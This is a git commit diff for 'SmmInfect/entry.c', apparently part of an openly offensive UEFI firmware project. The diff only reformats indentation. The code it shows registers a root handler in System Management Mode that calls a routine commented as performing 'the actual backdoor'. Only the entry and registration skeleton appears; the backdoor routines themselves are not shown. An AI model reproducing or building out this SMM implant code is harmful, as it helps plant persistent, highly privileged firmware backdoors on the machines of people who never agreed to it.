0fce2d7ea1630b035a1b56feb713bfd8f37ee5ed
Oliver <66334947+Oliver-1-1@users.noreply.github.com>
2024-10-13 19:58:37 +0200

    Update entry.c

--- SmmInfect/entry.c
+++ SmmInfect/entry.c
@@ -9,47 +9,47 @@ VOID EFIAPI ClearCache();
 
 EFI_STATUS EFIAPI SmiHandler(EFI_HANDLE dispatch, CONST VOID* context, VOID* buffer, UINTN* size)
 {
-	// This is redundant but is done for security reasons. rendezvous
-	if(EFI_ERROR(SmmWaitForAllProcessor(TRUE)))
-	{
-		//while(TRUE){}
-		return EFI_SUCCESS;
-	}
+  // This is redundant but is done for security reasons. rendezvous
+  if (EFI_ERROR(SmmWaitForAllProcessor(TRUE)))
+  {
+    //while(TRUE){}
+    return EFI_SUCCESS;
+  }
 
-	// Perform the actual backdoor
-	PerformCommunication();
+  // Perform the actual backdoor
+  PerformCommunication();
 
-	// Make sure we are not running into a cache side channel attack. When the system leaves SMM it might clear cache.
-	//ClearCache();
+  // Make sure we are not running into a cache side channel attack. When the system leaves SMM it might clear cache.
+  //ClearCache();
 
-	return EFI_SUCCESS;
+  return EFI_SUCCESS;
 }
 
 EFI_STATUS EFIAPI UefiMain(IN EFI_LOADED_IMAGE* image, IN EFI_SYSTEM_TABLE* table)
 {
-	gRT = table->RuntimeServices;
-	gBS = table->BootServices;
-	gST = table;
+  gRT = table->RuntimeServices;
+  gBS = table->BootServices;
+  gST = table;
 
-	if (EFI_ERROR(gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, 0, (void**)&SmmBase2)))
-	{
-		return EFI_SUCCESS;
-	}
+  if (EFI_ERROR(gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, 0, (void**)&SmmBase2)))
+  {
+    return EFI_SUCCESS;
+  }
 
-	if (EFI_ERROR(SmmBase2->GetSmstLocation(SmmBase2, &GSmst2)))
-	{
-		return EFI_SUCCESS;
-	}
+  if (EFI_ERROR(SmmBase2->GetSmstLocation(SmmBase2, &GSmst2)))
+  {
+    return EFI_SUCCESS;
+  }
 
-	//Register root handler
-	EFI_HANDLE handle;
-	GSmst2->SmiHandlerRegister(&SmiHandler, NULL, &handle);
+  //Register root handler
+  EFI_HANDLE handle;
+  GSmst2->SmiHandlerRegister(&SmiHandler, NULL, &handle);
 
-	if (EFI_ERROR(SetupMemoryMap()))
-	{
-		return EFI_ERROR_MAJOR;
-	}
+  if (EFI_ERROR(SetupMemoryMap()))
+  {
+    return EFI_ERROR_MAJOR;
+  }
 
-	return EFI_SUCCESS;
+  return EFI_SUCCESS;
 }
 #pragma optimize("", on)
